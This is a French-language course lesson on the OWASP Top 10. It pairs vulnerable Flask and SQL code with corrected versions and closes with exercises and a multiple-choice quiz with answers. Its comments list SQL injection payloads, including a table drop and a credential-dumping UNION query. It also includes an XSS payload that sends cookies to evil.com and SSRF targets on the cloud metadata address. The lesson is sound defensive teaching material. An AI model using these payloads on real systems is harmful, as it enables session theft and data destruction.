# TOME P2 — Réseaux & Télécoms — Jour 71 (6h) : Sécurité des Applications Web — OWASP Top 10

> [!NOTE]
> **Objectif du jour :** Comprendre et analyser les 10 vulnérabilités web les plus critiques selon l'OWASP (Open Web Application Security Project) : Injection SQL, XSS, IDOR, SSRF, RCE et autres. Apprendre à lire du code vulnérable et à appliquer les corrections appropriées — approche défensive (Blue Team).
>
> **Compétences visées :** `SEC-05` (A) — Sécurité Applicative | `BIT-05` (A) — Lecture et Analyse de Code

---

## 1) Module — OWASP Top 10 : Catégories & Contexte (2h)

### 📖 Narration/Intuition

L'OWASP Top 10 est la liste de référence mondiale des risques de sécurité applicatifs les plus critiques. Publiée et mise à jour par l'Open Web Application Security Project (OWASP), elle guide les développeurs, les pentesters et les équipes sécurité dans la priorisation des risques. Une banque centrale qui expose des APIs ou un portail web doit absolument maîtriser et défendre contre ces 10 catégories.

### 🔍 Anatomie Technique

**OWASP Top 10 (édition 2021) :**

```
A01 - Broken Access Control (Contrôle d'accès défaillant)
      → 94% des apps testées ont une forme de contrôle d'accès défaillant
      
A02 - Cryptographic Failures (Défaillances cryptographiques)
      → Données sensibles en clair, algorithmes obsolètes (MD5, DES)
      
A03 - Injection
      → SQL, LDAP, OS Command, NoSQL, XPath injection
      
A04 - Insecure Design (Conception non sécurisée)
      → Absence de modélisation des menaces dès la conception

A05 - Security Misconfiguration (Mauvaise configuration)
      → Comptes par défaut, pages d'erreur verboses, services inutiles
      
A06 - Vulnerable Components (Composants vulnérables)
      → Bibliothèques/frameworks non à jour (Log4Shell - CVE-2021-44228)
      
A07 - Identification & Authentication Failures
      → Brute force, session fixation, mots de passe faibles
      
A08 - Software & Data Integrity Failures
      → Dépendances non vérifiées, pipeline CI/CD compromis
      
A09 - Security Logging & Monitoring Failures
      → Absence de logs, logs non surveillés
      
A10 - Server-Side Request Forgery (SSRF)
      → Le serveur est forcé à faire des requêtes vers des ressources internes
```

---

## 2) Module — Injection SQL & XSS : Analyse de Code Vulnérable (2h)

### 📖 Narration/Intuition

L'**injection** est la vulnérabilité la plus exploitée depuis des décennies. Son principe est simple : des données fournies par l'utilisateur sont interprétées comme du code par l'interpréteur (SQL, shell, JavaScript). La défense est aussi simple : ne jamais construire des requêtes par concaténation de chaînes.

### 🔍 Anatomie Technique

**SQL Injection — Lire du code vulnérable :**

```python
# ❌ CODE VULNÉRABLE — NE PAS REPRODUIRE EN PRODUCTION
import sqlite3

def authentifier_vulnérable(login, mot_de_passe):
    """Cette fonction est DANGEREUSEMENT vulnérable à la SQLi."""
    conn = sqlite3.connect("banque.db")
    cursor = conn.cursor()
    
    # PROBLÈME : le login et mot_de_passe sont directement interpolés dans la requête SQL
    # Un attaquant peut manipuler la structure de la requête SQL elle-même
    requete = f"SELECT * FROM utilisateurs WHERE login='{login}' AND mdp='{mot_de_passe}'"
    # Si login = admin'-- , la requête devient :
    # SELECT * FROM utilisateurs WHERE login='admin'--' AND mdp='...'
    # Le -- commente tout ce qui suit → le mot de passe est ignoré !
    
    cursor.execute(requete)  # ❌ VULNÉRABLE
    return cursor.fetchone()

# Charge utile SQLi classiques (à connaître pour la défense) :
# login = "admin'--"           → Contournement de mot de passe
# login = "' OR '1'='1"        → Retourne tous les utilisateurs
# login = "'; DROP TABLE utilisateurs; --"  → Destruction de données
# login = "' UNION SELECT 1,username,password FROM admin--"  → Exfiltration

# ✅ CODE CORRIGÉ — Utiliser des requêtes paramétrées (prepared statements)
def authentifier_sécurisé(login, mot_de_passe):
    """Version sécurisée avec requêtes préparées."""
    conn = sqlite3.connect("banque.db")
    cursor = conn.cursor()
    
    # Les paramètres ? sont passés séparément — jamais interpolés dans le SQL
    requete = "SELECT * FROM utilisateurs WHERE login=? AND mdp=?"
    cursor.execute(requete, (login, mot_de_passe))  # ✅ SÉCURISÉ
    return cursor.fetchone()
```

```python
# Détection de SQLi dans du code existant — signes d'alerte
import re

def auditer_code_pour_sqli(contenu_fichier):
    """Recherche des patterns de construction SQL vulnérable."""
    patterns_dangereux = [
        r'execute\s*\(\s*["\'].*%.*["\']',      # % formatting dans SQL
        r'execute\s*\(\s*f".*SELECT.*\{',         # f-string dans SQL
        r'execute\s*\(\s*".*"\s*\+',              # Concaténation dans SQL
        r'cursor\.execute\([^,)]*\+',             # + dans execute()
    ]
    
    alertes = []
    for i, ligne in enumerate(contenu_fichier.split('\n'), 1):
        for pattern in patterns_dangereux:
            if re.search(pattern, ligne, re.IGNORECASE):
                alertes.append(f"Ligne {i}: SQLi potentielle → {ligne.strip()}")
    
    return alertes
```

**XSS (Cross-Site Scripting) — Analyse et remédiation :**

```python
# ❌ CODE VULNÉRABLE — XSS Réfléchi (Reflected XSS)
from flask import Flask, request

app = Flask(__name__)

@app.route('/recherche')
def recherche_vulnerable():
    terme = request.args.get('q', '')
    # PROBLÈME : le terme est directement injecté dans le HTML sans encodage
    # Charge utile : ?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
    return f"<h1>Résultats pour : {terme}</h1>"  # ❌ VULNÉRABLE

# ✅ CODE CORRIGÉ — Échappement HTML systématique
from markupsafe import escape   # Bibliothèque d'échappement sécurisée

@app.route('/recherche')
def recherche_sécurisée():
    terme = request.args.get('q', '')
    terme_echappé = escape(terme)  # <script> devient &lt;script&gt;
    return f"<h1>Résultats pour : {terme_echappé}</h1>"  # ✅ SÉCURISÉ

# Content Security Policy (CSP) — défense en profondeur contre XSS
@app.after_request
def ajouter_headers_sécurité(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

---

## 3) Module — IDOR, SSRF & Mauvaise Configuration (2h)

### 📖 Narration/Intuition

**IDOR (Insecure Direct Object Reference)** est la vulnérabilité de contrôle d'accès la plus courante : une API expose un identifiant (ID de compte, numéro de dossier) et ne vérifie pas si l'utilisateur connecté a le droit d'y accéder. **SSRF (Server-Side Request Forgery)** force le serveur à faire des requêtes vers des ressources internes inaccessibles depuis l'extérieur.

### 🔍 Anatomie Technique

**IDOR — Contrôle d'accès défaillant :**

```python
# ❌ CODE VULNÉRABLE — IDOR (A01 OWASP)
from flask import Flask, request, jsonify, session

app = Flask(__name__)

@app.route('/api/compte/<int:compte_id>')
def get_compte_vulnerable(compte_id):
    """
    PROBLÈME : n'importe quel utilisateur authentifié peut accéder
    au compte de n'importe quel autre utilisateur en changeant l'ID dans l'URL.
    Ex : /api/compte/12345 → accède au compte 12345 (même si ce n'est pas le sien)
    """
    compte = db.get_compte(compte_id)  # ❌ Pas de vérification de propriété
    return jsonify(compte)

# ✅ CODE CORRIGÉ — Vérification de propriété obligatoire
@app.route('/api/compte/<int:compte_id>')
def get_compte_sécurisé(compte_id):
    utilisateur_connecté = session.get('user_id')
    
    if not utilisateur_connecté:
        return jsonify({"erreur": "Non authentifié"}), 401
    
    # Vérifier que le compte appartient à l'utilisateur connecté
    compte = db.get_compte(compte_id)
    if compte is None or compte['proprietaire_id'] != utilisateur_connecté:
        return jsonify({"erreur": "Accès interdit"}), 403  # ✅ Autorisation vérifiée
    
    return jsonify(compte)
```

**SSRF — Server-Side Request Forgery :**

```python
# ❌ CODE VULNÉRABLE — SSRF (A10 OWASP)
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch')
def fetch_url_vulnerable():
    """
    PROBLÈME : le serveur fait une requête HTTP vers l'URL fournie par l'utilisateur
    sans validation. Un attaquant peut forcer le serveur à :
    - Accéder aux métadonnées cloud (http://169.254.169.254/latest/meta-data/)
    - Scanner le réseau interne (http://10.0.0.1:8080/)
    - Accéder aux services internes (http://localhost:6379 → Redis)
    """
    url = request.args.get('url')
    response = requests.get(url)  # ❌ DANGEREUX
    return response.text

# ✅ CODE CORRIGÉ — Validation stricte des URLs
from urllib.parse import urlparse
import ipaddress

DOMAINES_AUTORISÉS = {'api.externe-fiable.cd', 'cdn.bcc.cd'}

def url_est_safe(url):
    """Valide qu'une URL ne pointe pas vers des ressources internes."""
    try:
        parsed = urlparse(url)
        
        # Autoriser seulement HTTPS
        if parsed.scheme != 'https':
            return False, "Seul HTTPS est autorisé"
        
        # Bloquer les IPs privées et localhost
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return False, "Adresse IP interne interdite"
        except ValueError:
            pass  # C'est un hostname, pas une IP
        
        # Whitelist de domaines autorisés
        if parsed.hostname not in DOMAINES_AUTORISÉS:
            return False, f"Domaine {parsed.hostname} non autorisé"
        
        return True, "OK"
    except Exception as e:
        return False, str(e)

@app.route('/fetch')
def fetch_url_sécurisé():
    url = request.args.get('url', '')
    est_valide, raison = url_est_safe(url)
    
    if not est_valide:
        return jsonify({"erreur": f"URL refusée : {raison}"}), 400
    
    response = requests.get(url, timeout=5)  # ✅ Après validation
    return response.text
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **OWASP** | Open Web Application Security Project — référentiel de sécurité applicative |
| **XSS** | Cross-Site Scripting — injection de scripts malveillants côté client |
| **SQLi** | SQL Injection — injection de code SQL malveillant |
| **IDOR** | Insecure Direct Object Reference — accès non autorisé par manipulation d'identifiant |
| **SSRF** | Server-Side Request Forgery — forgerie de requête côté serveur |
| **RCE** | Remote Code Execution — exécution de code arbitraire à distance |
| **CSP** | Content Security Policy — politique de sécurité du contenu (header HTTP) |
| **WAF** | Web Application Firewall — pare-feu applicatif web |
| **DVWA** | Damn Vulnerable Web Application — application web volontairement vulnérable pour l'entraînement |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Identifiez la vulnérabilité dans ce code Python et proposez la correction :
```python
requete = "SELECT * FROM comptes WHERE id=" + request.args.get('id')
cursor.execute(requete)
```

**Corrigé :** SQLi par concaténation directe de paramètre non validé. Correction :
```python
compte_id = request.args.get('id')
cursor.execute("SELECT * FROM comptes WHERE id = ?", (compte_id,))
```

**Exercice 2 :** Un attaquant soumet `?url=http://169.254.169.254/latest/meta-data/` dans un formulaire. Qu'essaie-t-il d'obtenir ?

**Corrigé :** Il tente une attaque **SSRF** pour accéder aux **métadonnées de l'instance cloud AWS** (IMDSv1). Ces métadonnées contiennent les clés d'accès IAM temporaires attachées à l'instance — permettant à l'attaquant de prendre le contrôle du compte AWS de l'organisation.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Une requête SQL construite par concaténation : `"SELECT * FROM users WHERE name='" + name + "'"`. Quel est le risque ?
- A) Performances dégradées par l'absence d'index
- B) Injection SQL — un attaquant peut modifier la structure de la requête
- C) Erreur de syntaxe Python uniquement
- D) Exposition des mots de passe en clair dans les logs

**Réponse : B**

**Q2 :** La remédiation principale contre les injections SQL est :
- A) Utiliser des expressions régulières pour filtrer les inputs
- B) Convertir tout en majuscules avant l'exécution
- C) Utiliser des requêtes paramétrées (prepared statements) avec des placeholders
- D) Limiter la longueur du champ à 50 caractères

**Réponse : C**

**Q3 :** Une API `/api/facture/1234` retourne la facture sans vérifier si l'utilisateur connecté est le propriétaire de cette facture. Quelle vulnérabilité OWASP est illustrée ?
- A) A03 — Injection SQL
- B) A01 — Broken Access Control (IDOR)
- C) A10 — SSRF
- D) A07 — Authentication Failures

**Réponse : B**

**Q4 :** L'en-tête HTTP `Content-Security-Policy: default-src 'self'` protège contre quelle attaque ?
- A) SQL Injection
- B) SSRF
- C) Cross-Site Scripting (XSS) en bloquant le chargement de scripts depuis des domaines tiers
- D) CSRF (Cross-Site Request Forgery)

**Réponse : C**

**Q5 :** Une attaque SSRF réussit à atteindre `http://169.254.169.254`. Que signifie cette adresse IP dans un contexte cloud AWS ?
- A) L'adresse de loopback de l'application web
- B) Le serveur DNS interne de l'entreprise
- C) Le service de métadonnées de l'instance EC2 AWS (IMDS)
- D) L'interface d'administration du routeur interne

**Réponse : C**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
